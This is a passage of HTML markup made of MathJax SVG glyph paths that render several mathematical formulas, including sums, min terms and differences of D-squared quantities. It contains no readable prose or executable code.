transform="translate(861,-287.9) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2042.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2431.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(3181.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(12210.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.768ex;" xmlns="http://www.w3.org/2000/svg" width="43.341ex" height="6.347ex" role="img" focusable="false" viewBox="0 -1581.9 19156.7 2805.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mn" transform="translate(536,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1217.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(2273.1,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(456.8,-1123.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g><g data-mml-node="mi" transform="translate(3883.8,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4761.8,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5106.8,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5706.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(6095.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6595.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(7040.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(7918.4,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(8447.4,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(9019.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(9408.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(10186.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(10686.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mfrac" transform="translate(11131.1,0)"><g data-mml-node="mrow" transform="translate(220,747.9)"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(861,-287.9) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(2403.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3014.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msubsup" transform="translate(4015,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(861,-287.9) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5279.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5668.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(6418.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(3373.8,-686)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><rect width="7007.6" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(18378.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(18767.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.75ex;" xmlns="http://www.w3.org/2000/svg" width="24.134ex" height="4.899ex" role="img" focusable="false" viewBox="0 -950 10667.3 2165.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1155.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(2211.6,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(535,-1050) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g><g data-mml-node="mi" transform="translate(3822.2,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mo" transform="translate(4571.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4960.2,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5489.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6100.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="munder" transform="translate(7100.7,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(570.3,-1107.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g><g data-mml-node="mi" transform="translate(8711.3,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mo" transform="translate(9460.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 